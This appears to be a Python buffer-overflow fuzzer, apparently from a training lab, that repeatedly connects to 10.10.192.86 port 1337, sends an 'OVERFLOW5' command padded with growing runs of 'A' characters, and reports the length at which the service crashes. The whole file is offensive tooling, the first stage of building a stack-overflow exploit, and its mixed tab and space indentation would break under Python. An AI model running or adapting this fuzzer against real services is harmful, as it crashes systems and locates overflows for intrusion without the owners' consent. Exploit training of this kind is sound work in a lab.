# -*- coding: utf-8 -*-
from __future__ import unicode_literals
#!/usr/bin/python
import sys, socket
from time import sleep

buffer = "A" * 200

while True:
        try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect(('10.10.192.86',1337))
        	print("Sending: %s" % str(len(buffer)))
                s.send(("OVERFLOW5 " + buffer))
                s.close()
                sleep(4)
                buffer = buffer + "A" * 100

        except:
                print("Crushed at %s bytes" % str(len(buffer)))
                sys.exit()
